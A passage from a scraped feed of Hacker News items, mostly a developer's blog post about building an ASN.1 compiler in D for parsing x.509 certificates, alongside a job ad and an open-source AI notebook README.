    &lt;p&gt;“We still don’t understand nearly as much as we want,” Pai said. “It’s an important question for our time.”&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.quantamagazine.org/the-game-theory-of-how-algorithms-can-drive-up-prices-20251022/"/><published>2025-10-23T11:38:49+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45680847</id><title>Nango (YC W23) is hiring staff back-end engineers (remote)</title><updated>2025-10-23T17:37:17.499745+00:00</updated><content>&lt;doc fingerprint="ab8ec493530d96ab"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Shape the future of product integrations&lt;/head&gt;
    &lt;p&gt;We are a veteran team of dev-tool lovers. &lt;lb/&gt;We are passionate with serving developers, out in the open, with humility.&lt;/p&gt;
    &lt;head rend="h2"&gt;What is Nango?&lt;/head&gt;
    &lt;p&gt;Weâre building the integration layer for modern B2B software. Integrations are essential but often painful to buildâso weâre making them simple, reliable, and native. As companies adopt more software and AI becomes increasingly data-hungry, seamless integration is no longer optional.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why join?&lt;/head&gt;
    &lt;head rend="h3"&gt;Fully Remote&lt;/head&gt;
    &lt;p&gt;Our global team operates remotely with modern tools, valuing outcomes over hours.&lt;/p&gt;
    &lt;head rend="h3"&gt;Open-Source&lt;/head&gt;
    &lt;p&gt;We champion transparency, community and developer friendliness.&lt;/p&gt;
    &lt;head rend="h3"&gt;Developer Tool&lt;/head&gt;
    &lt;p&gt;Work for your peers, on pain points you know, with a fast feedback loop.&lt;/p&gt;
    &lt;head rend="h3"&gt;Technical challenges&lt;/head&gt;
    &lt;p&gt;From DevExp to high scale to API fragmentation, we work on hard problems.&lt;/p&gt;
    &lt;head rend="h3"&gt;Expert-Led&lt;/head&gt;
    &lt;p&gt;We are developer infrastructure veterans from Uber, Netlify, Algolia.&lt;/p&gt;
    &lt;head rend="h3"&gt;Traction&lt;/head&gt;
    &lt;p&gt;With fast-growing revenues &amp;amp; usage, itâs a perfect time to join.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.nango.dev/careers"/><published>2025-10-23T12:00:11+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45680937</id><title>Show HN: Deta Surf – An open source and local-first AI notebook</title><updated>2025-10-23T17:37:16.927974+00:00</updated><content>&lt;doc fingerprint="fc0186987a7cfe3"&gt;
  &lt;main&gt;
    &lt;p&gt;Deta Surf is an AI notebook that brings all your files and the web directly into your stream of thought.&lt;/p&gt;
    &lt;p&gt;It’s meant for simultaneous research and thinking that minimizes the grunt work: manually searching, opening windows &amp;amp; tabs, scrolling, copying and pasting into a document editor.&lt;/p&gt;
    &lt;p&gt;Surf is primarily built in Svelte, TypeScript and Rust, runs on MacOS, Windows &amp;amp; Linux, stores data locally in open formats, and is open source.&lt;/p&gt;
    &lt;p&gt;Most applications are focused on a single task, or a single media type: notes, websites, or PDFs. Real thinking requires juggling media across sources to make connections and synthesize ideas. We want to help people think better, across all their media.&lt;/p&gt;
    &lt;p&gt;Surf is built to be personal and open, in service of the user. This means local first data, open data formats, open source, and openness with respect to AI models. Read more.&lt;/p&gt;
    &lt;p&gt;Checkout the GitHub releases for the latest stable version of Surf for MacOS, Windows and Linux.&lt;/p&gt;
    &lt;p&gt;You can also download Surf with some managed &amp;amp; additional features (e.g. AI) from the Deta website. That version is subject to different terms.&lt;/p&gt;
    &lt;p&gt;For building from source and local development, see CONTRIBUTING.md.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;YouTube Notes: visit a YouTube video and ask a question&lt;/item&gt;
      &lt;item&gt;PDF Notes: open a PDF and ask a question&lt;/item&gt;
      &lt;item&gt;Create an applet: use the "app generation" tool and ask for an app&lt;/item&gt;
      &lt;item&gt;Notes that search the web: use the "web search" tool and ask a question with "search" in it&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Store almost any media in a private library on your computer, in an open and transparent format.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Support for local files, sites &amp;amp; links from the web (YouTube, Tweets &amp;amp; more), or create media directly in Surf.&lt;/item&gt;
      &lt;item&gt;Organize this library into Notebooks.&lt;/item&gt;
      &lt;item&gt;Open and use much of your library offline.&lt;/item&gt;
      &lt;item&gt;Use your library to power Surf’s AI features.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Surf's library is built on a local storage engine called SFFS (Surf Flat File System), which stores data in open and transparent formats.&lt;/p&gt;
    &lt;p&gt;Explore and think across your digital stuff without opening up a bunch of windows, clicking, scrolling and copying &amp;amp; pasting into your document (or chatbot).&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;@-mention&lt;/code&gt;and auto-generate from any tab, website or any resource in your library.&lt;/item&gt;
      &lt;item&gt;Trigger web searches to do research, and bring the results back in your notes.&lt;/item&gt;
      &lt;item&gt;Integrated citations deeplinked to original sources, whether a section on a webpage, a timestamp in a video, or a page in a PDF.&lt;/item&gt;
      &lt;item&gt;Generate interactive applications without writing code using Surflets.&lt;/item&gt;
      &lt;item&gt;Paste in images, tables or data from other applications and have Surf understand and incorporate them.&lt;/item&gt;
      &lt;item&gt;Use rich formating, code blocks, to-do lists and more in your notes.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Surf is built around tabs, split view and a sidebar for easy navigation.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Open local notes, files or web pages in tabs.&lt;/item&gt;
      &lt;item&gt;Split view allows you to view and interact with multiple resources side by side.&lt;/item&gt;
      &lt;item&gt;The sidebar provides quick access to your Notebooks &amp;amp; notes.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Surf can code interactive applets to help you visualize, understand or explore concepts or data that are aided with code.&lt;/p&gt;
    &lt;p&gt;Surf’s notes and Surflets are powered by large language models of your choice.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Bring your own key for popular models&lt;/item&gt;
      &lt;item&gt;Add a cloud model&lt;/item&gt;
      &lt;item&gt;Use Local Language Models&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Find the most common shortcuts here.&lt;/p&gt;
    &lt;p&gt;To report a security concern, please see https://github.com/deta/surf/security/policy&lt;/p&gt;
    &lt;p&gt;See CONTRIBUTING.md for details on contributing to the project and an overview of the codebase.&lt;/p&gt;
    &lt;p&gt;See CODE_OF_CONDUCT.md for details on our code of conduct.&lt;/p&gt;
    &lt;p&gt;The source code for this project is licensed under the Apache 2.0 license, with the following exceptions:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Our patch for the @ghostery/adblocker-electron package is licensed under the Mozilla Public License 2.0 (MPL-2.0), consistent with the upstream project's licensing.&lt;/item&gt;
      &lt;item&gt;Select files may contain their own specific license headers that override the default license.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Unless otherwise specified in the file or directory, all code defaults to the Apache 2.0 license.&lt;/p&gt;
    &lt;p&gt;See LICENSE for more details about the Apache 2.0 license.&lt;/p&gt;
    &lt;p&gt;Note: The Deta name and logos are trademarks of Deta GmbH and are not covered by the Apache 2.0 license.&lt;/p&gt;
    &lt;p&gt;Deta GmbH is a commercial open source company. Surf is designed to operate as open source software without needing Deta's servers. Deta GmbH also offers a modified version of Surf (which integrates with Deta's servers) and is subject to separate terms and conditions. This version of Surf can be downloaded from the Deta website.&lt;/p&gt;
    &lt;p&gt;This project makes use of the following open source packages (not a comprehensive list):&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/deta/surf"/><published>2025-10-23T12:11:27+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45681200</id><title>I spent a year making an ASN.1 compiler in D</title><updated>2025-10-23T17:37:16.563123+00:00</updated><content>&lt;doc fingerprint="1620d077aea51bd4"&gt;
  &lt;main&gt;&lt;p&gt;Published: 2025/10/23 | Updated: 2025/10/23&lt;/p&gt;&lt;p&gt;… and it’s still nowhere near complete.&lt;/p&gt;&lt;p&gt;In this post I’ll just rambling about ASN.1; parts of the compiler implementation, and some of the tool’s output rather than the tool itself as its still too WIP to really advertise on its own yet.&lt;/p&gt;&lt;p&gt;This post is unstructured, so you can just pick somewhere random and start reading from there with no/minimal context lost.&lt;/p&gt;&lt;p&gt;Note: the name of the tool is dasn1.&lt;/p&gt;&lt;p&gt;I’m currently writing Juptune - a toy async I/O framework that attempts to implement as much of its stack as possible in pure D.&lt;/p&gt;&lt;p&gt;I’m really interested in writing an implementation of TLS, which means I need to be able to handle x.509 certificates (i.e. TLS/SSL certs), which means I need to be able to handle their underlying data encoding: ASN.1’s DER encoding.&lt;/p&gt;&lt;p&gt;So basically I just wanted to do this for fun at the end of the day, nothing much deeper than that. I’ve never written or worked on a proper compiler project before that wasn’t toy-sized so I saw a ton of growth potential… the main thing that’s grown however is the mental scar ASN.1’s left on me.&lt;/p&gt;&lt;p&gt;I’ve succesfully generated code that can parse a couple of x.509 certificates I’ve thrown at it, and I’ve started work on an almost-D-native (excluding crypto primitives) implementation of TLS 1.3.&lt;/p&gt;&lt;p&gt;I’m constantly amazed about how much of modern life relies on these ancient, overly complicated specs from the 90s. ASN.1 is used everywhere in some form or another and yet I bet you’ve never even heard of it before, just have a look on wikipedia.&lt;/p&gt;&lt;p&gt;ASN.1 is the result of a bunch of graybeards from the late 80s+ trying to design an overengineered data specification language. In other words, it’s protobuf on steroids.&lt;/p&gt;&lt;p&gt;There’s two parts of ASN.1: There’s the ASN.1 notation (defined by x.680, x.681, x.682, and x.683), and then there’s the various encodings (BER, CER, DER, PER, XER, JER…). In this post I’ll mainly be focusing on the notation + DER.&lt;/p&gt;&lt;p&gt;Similarly to protobuf you use the notation to define a structured way to represent data, and then use tooling that can generate encoders/decoders for a specific encoding, in a specific programming language.&lt;/p&gt;&lt;p&gt;Here’s a choice snippet of the ASN.1 notation for RFC 5280 (which defines what’s commonly known as TLS certificates):&lt;/p&gt;&lt;p&gt;Encoding wise here’s a quick of some of the more well known ones:&lt;/p&gt;&lt;p&gt;Did I ever mention that ASN.1 is complicated? On the one hand the sheer amount of possible encodings is daunting, but on the other hand it shows a certain flexbility that ASN.1 provides - you could even invent your own domain-specific encoding if needed.&lt;/p&gt;&lt;p&gt;Loosely speaking you can define ASN.1’s notation as being the “base” notation defined in x.680, with the sometimes-optional addon specifications defined in x.681, x.682, x.683.&lt;/p&gt;&lt;p&gt;These specifications are also written in academicese so for mere uneducated mortals such as myself, simply trying to read and understand what the specifications are saying in the first place is already a large hurdle. I think I’ve started to get the hang of it though.&lt;/p&gt;&lt;p&gt;Fortunately for my use case of handling x.509 certificates, there’s no hard requirement for anything beyond x.680 and so x.680 is the only spec I’ve attempted to implement so far (outside of x.690 which describes how BER/CER/DER works - which is actually a joy to read compared to the x.68x specs).&lt;/p&gt;&lt;p&gt;x.680 isn’t the worst thing in the world to implement, it’s just the fact that there’s a lot more to it than you’d think from a quick glance at a code example, as well as some relatively annoying “transformation” (semantic) rules you have to acccount for.&lt;/p&gt;&lt;p&gt;Generally though I’d say the really difficult parts seem to come from its extensions.&lt;/p&gt;&lt;p&gt;One of the more annoying parts of implementing a parser for ASN.1’s notation is that x.680 has been revised several times over the years, which includes the deprecation + removal of certain features.&lt;/p&gt;&lt;p&gt;And so some other specifications you read through will either:&lt;/p&gt;&lt;p&gt;Meaning that if you want to write a compiler for ASN.1 for a specific use case, but want it to also be an implementation of the more modern specs… then you’ll have to partially implement/hack around some of the older stuff that’s no longer defined in the up to date spec documentation.&lt;/p&gt;&lt;p&gt;An example would be the &lt;code&gt;ANY DEFINED BY&lt;/code&gt; syntax, which I have a separate section on.&lt;/p&gt;&lt;p&gt;This is essentially the academic equivalent of an Elder Scroll - you will go insane attempting to read let alone mentally parse this damn thing.&lt;/p&gt;&lt;p&gt;x.681 describes the Information Class Object system. I’d love to talk to you more about it more in depth but I haven’t put in enough effort to confidently state much about how it works.&lt;/p&gt;&lt;p&gt;One of the few parts I sort of understand and can talk about is that x.681 has a really cool feature where Information Classes can be given a custom initialisation syntax:&lt;/p&gt;&lt;p&gt;I’d absolutely love to attempt to implement x.681 for the challenge of this feature alone, however I only have so much energy (and sanity), so it’ll likely be a while until I even properly consider it.&lt;/p&gt;&lt;p&gt;x.682 describes the Table Constraint feature. I’m going to be honest I don’t understand a single thing about this feature - I took one look at the specification and was like “absolutely not”.&lt;/p&gt;&lt;p&gt;x.683 describes the ability to create templated (sorry, “parameterised”) types. Similar to the other ASN.1 extensions I haven’t looked much into this feature, but it appears to be a lot simpler to implement than the others.&lt;/p&gt;&lt;p&gt;In essence, one of the things you can do is this:&lt;/p&gt;&lt;p&gt;It supports values as well as types within its template parameters (similarly to D!) so there’s a few cool things you can do with it I guess.&lt;/p&gt;&lt;p&gt;Despite the many, many, many pains of this god forsaken technology, it’s actually really interesting and powerful at the same time.&lt;/p&gt;&lt;p&gt;ASN.1’s notation contains a pretty neat feature where you can add special constraints onto types + fields. So rather than having a stray “ProtcolPacket.field1.field2.xyz MUST be between 0 and 2” that’s super easy to miss, you can instead describe this constraint within ASN.1 itself which (good) tooling will then take into account for you.&lt;/p&gt;&lt;p&gt;Here’s some examples of the simpler constraints available:&lt;/p&gt;&lt;p&gt;There’s a few more constraints available but… they’re mostly pretty complex ones that I don’t want to have to think about.&lt;/p&gt;&lt;p&gt;It’s really cool to see that ASN.1 has a feature like this though, considering the only other langauge I’ve personally encountered that has a similar feature is Ada.&lt;/p&gt;&lt;p&gt;ASN.1 generally uses the &lt;code&gt;OBJECT IDENTIFIER&lt;/code&gt; type in order to, well, identify specific things, e.g. extensions found within x.509 certificates.&lt;/p&gt;&lt;p&gt;&lt;code&gt;OBJECT IDENTIFIER&lt;/code&gt;s are also used to provide versions to modules, for example:&lt;/p&gt;&lt;p&gt;Everything between the curly brackets is an OBJECT IDENTIFIER for this exact module - technically no other ASN.1 module in existance should ever use this specific OBJECT IDENTIFIER. The optional labels (e.g. &lt;code&gt;iso&lt;/code&gt;) have no meaning beyond aiding human comprehension, it’s the values (e.g. &lt;code&gt;(0)&lt;/code&gt;) that are actually used to create the identifier.&lt;/p&gt;&lt;p&gt;As a great example of this versioning system, it just so happens that this specific module has a more modern version that has this specific OBJECT IDENTIFIER instead:&lt;/p&gt;&lt;p&gt;This updated version doesn’t change how data is encoded to/from DER but instead it simply uses more modern syntax and features.&lt;/p&gt;&lt;p&gt;This is important because older specifications will be using &lt;code&gt;PKIX1Implicit88&lt;/code&gt; whereas newer ones will likely be using &lt;code&gt;PKIX1Implicit-2009&lt;/code&gt; instead, and so there needs to be a more clear-cut way to distinguish between these two versions of the &lt;code&gt;PKIX1Implicit&lt;/code&gt; module other than going by its name - and this is where OBJECT IDENTIFIERS come in handy.&lt;/p&gt;&lt;p&gt;When importing modules within ASN.1 notation you can (and should) specify an OBJECT IDENTIFIER as well:&lt;/p&gt;&lt;p&gt;Maybe I’m just a nerd, but I find this to almost be a thing of beauty with how simple yet effective it is.&lt;/p&gt;&lt;p&gt;D has several quality of life features that makes it surprisingly easy to generate code for - features that would definitely make the compiler more annoying to work with when targeting other languages.&lt;/p&gt;&lt;p&gt;These features on their own aren’t exactly rare to see, but the specific combination is what makes everything work together so well.&lt;/p&gt;&lt;p&gt;&lt;code&gt;static import&lt;/code&gt; in D means “import this module, but ONLY allow it to be used via its fully qualified name”:&lt;/p&gt;&lt;p&gt;You can even override the module name, as strange as that sounds!&lt;/p&gt;&lt;p&gt;This feature is a godsend for preserving the original names of ASN.1 types. For example, Juptune provides an error type called &lt;code&gt;Result&lt;/code&gt; which comes from the &lt;code&gt;juptune.core.util.result&lt;/code&gt; module.&lt;/p&gt;&lt;p&gt;Without static imports I’d have to be careful of ASN.1 code that defines a &lt;code&gt;Result&lt;/code&gt; type as it’d otherwise come into conflict with Juptune’s own &lt;code&gt;Result&lt;/code&gt; type.&lt;/p&gt;&lt;p&gt;However, with static imports, I can basically just generate code that looks like this:&lt;/p&gt;&lt;p&gt;Completely removing the need of me having to worry about symbol name conflicts.&lt;/p&gt;&lt;p&gt;On a similar vein D allows you to specify that instead of looking up a symbol from any available symbol table (e.g. local vars; non-static imports, etc.) it should instead perform a lookup using the current module’s top-level symbols.&lt;/p&gt;&lt;p&gt;For example:&lt;/p&gt;&lt;p&gt;The leading &lt;code&gt;.&lt;/code&gt; in &lt;code&gt;.Type1&lt;/code&gt; is what causes the module-local lookup.&lt;/p&gt;&lt;p&gt;Essentially, this feature compliments the static import feature to help make it much harder for ASN.1 types to accidentally refer to the wrong symbol when converted into D code.&lt;/p&gt;&lt;p&gt;In short: this feature allowed me to be really really lazy with certain parts of the compiler :D&lt;/p&gt;&lt;p&gt;As the name suggests, &lt;code&gt;typeof()&lt;/code&gt; allows you to retrieve the type of any particular symbol you pass into it - this is great when dealing with code generation since sometimes it can be kind of annoying to structure your code in a way where you can easily preserve the type name of some symbol you’re working with.&lt;/p&gt;&lt;p&gt;In other words “this let’s me write bad code and make it still work”.&lt;/p&gt;&lt;p&gt;First example is around how some getters and setters for SEQEUENCE fields are generated. Instead of doing the correct thing and preserving the type name for each field, I got lazy and just used &lt;code&gt;typeof(_field)&lt;/code&gt;:&lt;/p&gt;&lt;p&gt;The second example is around error messages. Instead of needing to keep track of the current type’s name when generating error messages… I could just use &lt;code&gt;typeof(this)&lt;/code&gt; to get the type instead:&lt;/p&gt;&lt;p&gt;What’s even better is that because the entire string is composed of compile-time constants, it doesn’t actually require an allocation + concat at runtime since the compiler will constant fold it for you. This allows &lt;code&gt;fromDecoding&lt;/code&gt; to still be marked as &lt;code&gt;@nogc&lt;/code&gt;!&lt;/p&gt;&lt;p&gt;Generating a parameter list and don’t want to have to care about whether there’s an extra comma or not?&lt;/p&gt;&lt;p&gt;Enum options?&lt;/p&gt;&lt;p&gt;Array values?&lt;/p&gt;&lt;p&gt;D’s got your back! (Except for specifying multiple modules in a single import statement, then for some reason you’re not allowed, but shh about that).&lt;/p&gt;&lt;p&gt;For a while a lot of the types being generated (and some of the core decoding types) didn’t have a &lt;code&gt;toString&lt;/code&gt; implementation. This’d normally mean that I couldn’t just use &lt;code&gt;.toString&lt;/code&gt; willy-nilly but instead the compiler would need knowledge about which types had a &lt;code&gt;toString&lt;/code&gt; or not.&lt;/p&gt;&lt;p&gt;However, as is the common theme now D allows us to be very lazy - instead of keeping track of this ourselves in dasn1, we can instead just generate code where it’s the D compiler’s concern instead of our’s:&lt;/p&gt;&lt;p&gt;Job sorted (and future proofed!).&lt;/p&gt;&lt;p&gt;You could definitely utilise D’s metaprogramming for more complicated stuff, but it’s also good for silly little things like this.&lt;/p&gt;&lt;p&gt;Naturally I’ve tried to use whatever D features that I could in order to implement dasn1, so I thought I’d pick a few parts of the code that rely on D’s features quite heavily as a small showcase.&lt;/p&gt;&lt;p&gt;Mixin templates are a fairly quirky feature of D - it allows you to define a normal template (essentially a compile-time collection of symbols) and then copy-paste them wherever you like, whether that’s inside a class, struct, the top-level module etc.&lt;/p&gt;&lt;p&gt;Since the ASN.1 grammar only had a handful of node “types”, I decided to use mixin templates to model each specific “type”:&lt;/p&gt;&lt;p&gt;I probably could’ve gotten away with just using templated base classes instead, but there’s a few differences that actually make that kind of annoying. Namely it’d create some bloated symbol names which would make reading compiler errors even more painful than it already ended up being.&lt;/p&gt;&lt;p&gt;Let’s look at one of the AST nodes again:&lt;/p&gt;&lt;p&gt;This is a node that contains several other nodes. &lt;code&gt;Container&lt;/code&gt; itself supports an unbounded amount of node types it can store, since D supports variadic template parameters. You may be asking what the API for this even looks like, and I’ll be glad to show you a quick snippet:&lt;/p&gt;&lt;p&gt;Let’s have a look at a &lt;code&gt;OneOf&lt;/code&gt; node instead now:&lt;/p&gt;&lt;p&gt;This node has a similar template-based API for most of its operations:&lt;/p&gt;&lt;p&gt;However the main feature of the &lt;code&gt;OneOf&lt;/code&gt; node is its &lt;code&gt;match&lt;/code&gt; function. This function requires the user to pass in a handler function for each possible node type that the &lt;code&gt;OneOf&lt;/code&gt; can store, and this requirement is enforced at compile-time so that changes to the node type list will immediately require all appropriate &lt;code&gt;match&lt;/code&gt; functions to be updated (i.e. no silent breakage).&lt;/p&gt;&lt;p&gt;This is surprisingly easy to implement with D due to its first-class metaprogramming features, I’ll try my best to be brief with how this all works:&lt;/p&gt;&lt;p&gt;In essence:&lt;/p&gt;&lt;code&gt;NodeTypes...&lt;/code&gt; is the template parameter containing a compile-time tuple of all possible types that this &lt;code&gt;OneOf&lt;/code&gt; can store.&lt;code&gt;oneOfHandlerFuncTuple&lt;/code&gt; is a template that generates a new compile-time tuple, where each &lt;code&gt;NodeTypes&lt;/code&gt; is mapped into a function pointer type.&lt;code&gt;match&lt;/code&gt; uses the result of &lt;code&gt;oneOfHandlerFuncTuple&lt;/code&gt; as its main parameter. Since this is a compile-time tuple of types it automagically gets expanded into multiple parameters under the hood.&lt;code&gt;static foreach&lt;/code&gt; within &lt;code&gt;match&lt;/code&gt;’s body allows us to iterate over a compile-time collection (in this case, &lt;code&gt;NodeTypes&lt;/code&gt;) and duplicate the foreach’s body for each item. In this case, so we can make a &lt;code&gt;case&lt;/code&gt; statement per item in &lt;code&gt;NodeTypes&lt;/code&gt;.&lt;p&gt;So:&lt;/p&gt;&lt;code&gt;NodeTypes...&lt;/code&gt; is &lt;code&gt;(Node1, Node2)&lt;/code&gt;.&lt;code&gt;oneOfHandlerFuncTuple&lt;/code&gt; results in &lt;code&gt;(Result delegate(Node1), Result delegate(Node2))&lt;/code&gt;&lt;code&gt;match&lt;/code&gt;’s parameters expand into &lt;code&gt;match(scope delegate(Node1) handler_0, scope delegate(Node2) handler_1)&lt;/code&gt;&lt;p&gt;Which means that we could use this example match function like so:&lt;/p&gt;&lt;p&gt;I know that’s a lot to take in especially since I have to be briefer than usual, but TL;DR D makes the hard stuff easy while still being relatively easy on the eyes. I would make a snarky comparison with C++ but literally no one expects C++ metaprogramming to be readable at this point.&lt;/p&gt;&lt;p&gt;10 years ago (October 2015) D’s standard library was given an experimental package called &lt;code&gt;std.experimental.allocator&lt;/code&gt;. It has a pretty neat but kind of janky way of composing a bunch of allocation building blocks together, in order to “easily” make custom allocators.&lt;/p&gt;&lt;p&gt;I use it for the ASN.1 stuff since it makes it easy to construct and dispose classes within &lt;code&gt;@nogc&lt;/code&gt; code, and it looks kind of cool to boot:&lt;/p&gt;&lt;p&gt;The issue is this package is still experimental 10 years later and I wouldn’t be surprised if it gets removed sooner or later, especially with the Phobos v2 work that’ll hopefully exist in some form before I retire (I’m 26).&lt;/p&gt;&lt;p&gt;:D The sign of someone who loves this damn language is that they can’t help but provide some level of historical snark. I have no further comments, I just miss the days I had hope for D’s future xD&lt;/p&gt;&lt;p&gt;Situation: I need to store IR nodes using a base class rather than a specific concrete implementation class, but I’d still like to limit the potential options without having to go down the SumType route.&lt;/p&gt;&lt;p&gt;Solution: This short but sweet struct (note: this is a different &lt;code&gt;OneOf&lt;/code&gt; struct for IR purposes, not AST purposes).&lt;/p&gt;&lt;p&gt;We can initialise this struct like so:&lt;/p&gt;&lt;p&gt;Now the fun part comes from this weird &lt;code&gt;alias ir this;&lt;/code&gt; line. Normally when working with a wrapper struct like this you’d have do something like:&lt;/p&gt;&lt;p&gt;With &lt;code&gt;alias ir this;&lt;/code&gt; anytime we try to perform an operation (e.g. casting; function calls, etc.) that the &lt;code&gt;OneOf&lt;/code&gt; struct itself does not support, the compiler will instead try to use it on the &lt;code&gt;OneOf.ir&lt;/code&gt; field instead:&lt;/p&gt;&lt;p&gt;It’s a very weird, niche feature which might even get removed or at least deprecated in the future, but it allows for some mild syntax cleanup as shown above.&lt;/p&gt;&lt;p&gt;Some of the IR types try to strictly limit the way that user code can query and interact with their data, mainly to help prevent potential memory corruption… at least that was my original, flawed reasoning.&lt;/p&gt;&lt;p&gt;This can be awkward when writing unittests, as sometimes you just need to query a very particular part of a type’s data without having to go through all of its hurdles.&lt;/p&gt;&lt;p&gt;And so by simply slapping &lt;code&gt;version(unittest)&lt;/code&gt; onto a funciton definition, you now have an escape hatch that won’t make its way out into real code:&lt;/p&gt;&lt;p&gt;There’s a few examples of this within the codebase. Sometimes unittests are for the most part identical except:&lt;/p&gt;&lt;p&gt;It’s one of those things where you kind of just have to use it and do it before you “get it”, so I apologise for the really poor explanation, but this is essentially something you can do with templates.&lt;/p&gt;&lt;p&gt;Here’s one of the templated “test harnesses” I used - this one in particular is for testing the AST -&amp;gt; IR converter functions.&lt;/p&gt;&lt;p&gt;It can be used like so:&lt;/p&gt;&lt;p&gt;One main issue, especially for the larger tests, is that specifying &lt;code&gt;Harness.T&lt;/code&gt; (and more minorly &lt;code&gt;Harness.run&lt;/code&gt;) can start to make the code look chunky and a bit harder to read.&lt;/p&gt;&lt;p&gt;So by using the magical &lt;code&gt;with()&lt;/code&gt; statement, instead of writing &lt;code&gt;Harness.run&lt;/code&gt; and &lt;code&gt;Harness.T&lt;/code&gt;, we can just write &lt;code&gt;run&lt;/code&gt; and &lt;code&gt;T&lt;/code&gt; and the compiler will know how to lookup these otherwise missing/undefined symbols:&lt;/p&gt;&lt;p&gt;Again this is one of those things that on paper sounds really stupid (and impossible to easily describe), but grows on you really fast when you give it a try.&lt;/p&gt;&lt;p&gt;While ASN.1’s basic syntax looks pretty easy from an initial glance, that illusion shatters once you start getting into it more deeply.&lt;/p&gt;&lt;p&gt;ASN.1 has various separate value forms that start with a left bracket (&lt;code&gt;{&lt;/code&gt;), a lot of these forms are ambiguous due to a variety of factors and can only be distinguished with semantic context.&lt;/p&gt;&lt;p&gt;Given that dans1 has a clean split between syntax and semantic analysis, “this does not spark joy” as the kids would say.&lt;/p&gt;&lt;p&gt;I’ll let this comment from the parser code explain itself:&lt;/p&gt;&lt;p&gt;:D Fun times.&lt;/p&gt;&lt;p&gt;Example: I can’t even remember the exact conditions, but I remember having to debug some generated decoder code since it was failing to decode a specific field. It turned out that this field was under certain “exact conditions” that meant its tag was supposed to be treated as &lt;code&gt;EXPLICIT&lt;/code&gt; instead of the module-default &lt;code&gt;IMPLICIT&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;I still have no idea where in the spec this behaviour gets mentioned and so I basically had to wing a fix and hope it works going forward.&lt;/p&gt;&lt;p&gt;More generally this feeling and scenario has happened quite a few times - the information is scattered (sometimes across different specs) and is hard to keep track of.&lt;/p&gt;&lt;p&gt;Another example is around module versions. The spec makes absolutely zero mention (that I can see) on how to version modules for non ISO/ITU purposes, and I would greatly appreciate if anyone could help me find this information.&lt;/p&gt;&lt;p&gt;I’d be amazed if there’s a 100% spec compliant implementation out there, even commercially.&lt;/p&gt;&lt;code&gt;UTF8String (SIZE ("yagababa"))&lt;/code&gt; doesn’t make sense.&lt;code&gt;myInt INTEGER (1) ::= 2&lt;/code&gt; needs to trigger an error.&lt;p&gt;It’s tedious and not very fun, but there’s no real way around it.&lt;/p&gt;&lt;p&gt;For a newbie to compiler programming like me I also found it really hard to deal with useful error messages. I ended up running the checks twice: one time to see if there’s even an error at all, and the second time to build up the error string. This is mainly complicated by the existance of UNION and (especially) INTERSECTION constraints.&lt;/p&gt;&lt;p&gt;I foolishly made the mistake of believing that once I converted the generic AST nodes into the more specific IR nodes that I wouldn’t have to make any major changes to the underlying data (beyond setting up things like symbol tables).&lt;/p&gt;&lt;p&gt;:D Unfortunately that wonderfully naive thought was quickly crushed as ASN.1 requires the semantic stage to perform certain transformations, certain transformations (e.g. &lt;code&gt;AUTOMATIC TAGS&lt;/code&gt;) that ended up/are going to be really annoying due to the way I’ve structured the code.&lt;/p&gt;&lt;p&gt;But that’s future Brad’s problem.&lt;/p&gt;&lt;p&gt;I am extremely thankful that x.509 is an old enough specification that the ASN.1 notation only uses the older syntax of x.680.&lt;/p&gt;&lt;p&gt;The alternative is that you’d need an implementation of the x.681, x.682, and x.683 specs to use any of the newer stuff - this is absolutely non-trivial to implement, and I imagine this is one of the many reasons ASN.1 hasn’t ever really taken off outside of historical and commercialised spaces.&lt;/p&gt;&lt;p&gt;There is one exception to the above however and that is &lt;code&gt;ANY DEFINED BY&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;It’d basically be used to define a type who’s contents could be any other type conditioned by some other field:&lt;/p&gt;&lt;p&gt;You then have to piece together what identifier matches which type. Dasn1 doesn’t actually implement &lt;code&gt;ANY DEFINED BY&lt;/code&gt; as-is since even by the 2003 revision it was deprecated.&lt;/p&gt;&lt;p&gt;Instead, for better or for worse, dasn1 has a hacked together intrinsic called &lt;code&gt;Dasn1-Any&lt;/code&gt;:&lt;/p&gt;&lt;p&gt;This essentially gets lowered down into the decoding code for &lt;code&gt;OCTET STRING&lt;/code&gt; but without any sort of tag validation enabled. Unfortunately until/unless I want to implement Information Object Classes, I’m then stuck with having to manually call into the decoding code when I want to turn &lt;code&gt;Dans1-Any&lt;/code&gt; fields into their actual types.&lt;/p&gt;&lt;p&gt;This is more of a personal one.&lt;/p&gt;&lt;p&gt;Between the various different aspects of the ASN.1 compiler, the x.68x specs, the x.690 spec, and all of the other projects building off of this ASN.1 work (x.509 certificate handling, TLS 1.3) I started to feel like a stranger in my own codebase, even just a week after I had last touched it.&lt;/p&gt;&lt;p&gt;It’ll definitely be interesting making future improvements/changes as my at-hand knowledge is constantly dwindling.&lt;/p&gt;&lt;p&gt;From having to write 20,000 different node visitors for various reasons; to hand-rolling a syntax parser for a boring, drawn out grammar; to needing to write code that looks 95% the same as the last but that last 5% of difference ranges from drudge to mentally taxing, repeated 9000 times.&lt;/p&gt;&lt;p&gt;I think I can finally say I have some proper compiler experience under my belt ;(&lt;/p&gt;&lt;p&gt;But lord 